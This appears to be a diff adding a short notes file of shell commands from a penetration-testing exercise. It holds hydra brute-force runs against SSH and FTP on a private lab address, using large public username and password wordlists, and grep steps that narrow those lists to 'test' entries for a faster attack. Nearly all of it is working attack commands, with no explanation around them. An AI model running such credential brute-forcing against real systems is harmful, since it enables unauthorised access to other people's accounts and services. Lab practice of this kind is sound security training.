@@ -1,0 +1,19 @@
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt ssh://192.168.1.217 -t4 -V
+hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.217 -t64 -V
+
+hydra -L /usr/share/wordlists/rockyou.txt -p /dev/null ftp://192.168.1.217 -t64 -V
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p /dev/null ftp://192.168.1.217 -t64 -f
+
+hydra -L /usr/share/wordlists/seclists/Usernamesxato-net-10-million-usernames.txt -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt ftp://192.168.1.217 -t64 -f
+hydra -l test_user -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt ftp://192.168.1.217 -t64 -f
+
+grep -i "test" /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt > filtered_usernames.txt
+grep -i "test" /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt > filtered_passwords.txt
+
+grep -i "test_" /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt > super_filtered_usernames.txt
+grep -i "testp" /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt > super_filtered_passwords.txt
+
+hydra -L /home/kali/Desktop/hydra/filtered_usernames.txt -p /dev/null ftp://192.168.1.217 -t64 -f
+hydra -l test_user -P /home/kali/Desktop/hydra/filtered_passwords.txt ftp://192.168.1.217 -t64 -f
+
+hydra -L /home/kali/Desktop/hydra/super_filtered_usernames.txt -P /home/kali/Desktop/hydra/super_filtered_passwords.txt ftp://192.168.1.217 -t64 -f
